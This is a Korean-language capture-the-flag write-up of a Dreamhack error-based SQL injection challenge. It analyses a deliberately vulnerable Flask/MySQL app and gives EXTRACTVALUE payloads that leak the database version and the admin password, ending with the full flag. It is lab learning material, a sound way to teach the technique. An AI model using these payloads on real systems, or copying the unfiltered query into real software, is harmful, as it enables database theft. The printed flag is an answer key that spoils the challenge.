# [Dreamhack Wargame] error based sql injection
### [🚩error based sql injection](https://dreamhack.io/wargame/challenges/412/)
  <img width="1069" alt="error-based-sqli_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/581054bc-eba7-4d60-a902-d4ca92bb04a8">

<br/><br/>

## 문제 파일 분석
### init.sql
```sql
CREATE DATABASE IF NOT EXISTS `users`; -- users 데이터베이스가 존재하지 않는다면 CREATE DATABASE로 생성함
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass'; -- 권한 설정

USE `users`;
CREATE TABLE user( -- CREATE TABLE로 user 테이블 생성 (열: idx, uid, upw)
  idx int auto_increment primary key, -- auto_increment(시작값은 1, 새로운 행이 추가될 때마다 1씩 자동 증가)
  uid varchar(128) not null,
  upw varchar(128) not null
);

-- user 테이블에 admin 계정 생성 (idx: 1, uid: admin, upw: 플래그)
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');

-- user 테이블에 guest 계정 생성 (idx: 2, uid: guest, upw: guest)
INSERT INTO user(uid, upw) values('guest', 'guest');

-- user 테이블에 test 계정 생성 (idx: 3, uid: test, upw: test)
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```
* init.sql 실행 결과로 생성된 users 데이터베이스의 user 테이블
    | idx (primary key) | uid | upw |
    |---|---|---|
    | 1 | 'admin' | 플래그 |
    | 2 | 'guest' | 'guest' |
    | 3 | 'test' | 'test' |

<br/>

### app.py
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

# Flask와 mysql을 이용한 웹 서버가 동작하고 있음
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

# 인덱스 페이지
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid') # 이용자가 전달한 uid 인자값을 가져옴
    if uid: # uid가 존재하는 경우
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';") # uid를 이용해 users 테이블을 조회하는 쿼리를 반환함
            return template.format(uid=uid) # template 변수의 내용을 화면에 출력함 (uid를 인자로 제공)
        except Exception as e: # 쿼리 실패 시
            return str(e) # 에러를 출력함
    else: # uid가 존재하지 않는 경우
        return template # template 변수의 내용을 화면에 출력함


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
index 함수에서 이용자가 전달한 uid가 별도의 필터링 없이 바로 mysql 쿼리로 사용되기 때문에 SQL Injection이 발생함
* Error based SQL Injection 테스트
    - 코드를 보면 입력값을 ```'``` 문자로 감싸고 있으므로 ```'``` 문자를 넣어 SQL Injection 공격을 수행해야 함
    - ```EXTRACTVALUE``` 함수를 사용하여 올바르지 않은 XPATH 식으로 운영 체제에 대한 정보가 포함된 에러 메시지를 출력시킴
        + 이용자의 입력값(uid 인자값): ```1' AND EXTRACTVALUE(1, CONCAT(0x3a, version()));--```
        + 생성되는 쿼리
            ```sql
            SELECT * FROM user WHERE uid='1' AND EXTRACTVALUE(1, CONCAT(0x3a, version()));--'
            ```
        + 쿼리 실행 결과: 운영체제의 정보를 획득할 수 있음 (해당 서버가 MariaDB를 사용하고 있음을 알 수 있음)
            <img width="1029" alt="test1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/cb824b00-24ac-4b72-8c12-c138ec1ae723">
            <img width="1029" alt="test2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/734f5080-9f77-4323-83da-0686701a7d42">

<br/><br/>

### 익스플로잇
1. 비밀번호를 추출하기 위해서 실행해야 하는 SQL 쿼리문(```SELECT upw FROM user WHERE uid='admin'```)을 EXTRACTVALUE의 XPATH 식 부분에 삽입하여 실행시킴
    - 쿼리 실행을 위해 입력해야 하는 uid 인자값: ```1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT upw FROM user WHERE uid='admin')));--```
    - 쿼리 실행 결과 XPATH 식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 user 테이블의 admin 계정의 upw가 포함되어 있음 (플래그 획득 가능)
        <img width="1029" alt="exploit1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/1b9f6fae-5cc6-4883-848f-0c8230c5bf5e">

2. 플래그의 길이가 길어서 뒷부분이 잘려서 나오기 때문에 플래그의 뒷부분을 보기 위해서 XPATH 식에 삽입된 서브쿼리(SELECT 문)을 약간 수정하여 다시 공격을 수행함
    - 수정된 CONCAT의 서브쿼리: ```SELECT substr(upw, 20, 25) FROM user WHERE uid='admin'```
    - 쿼리 실행을 위해 입력해야 하는 uid 인자값: ```1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT substr(upw, 20, 25) FROM user WHERE uid='admin')));--```
    - 실행 결과
        <img width="1029" alt="exploit2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/90fc0bf1-b037-4942-a9a3-a4682a6dbb54">


3. 두 개의 결과를 합하면 플래그(```DH{c3968c78840750168774ad951fc98bf788563c4d}```)를 획득할 수 있음

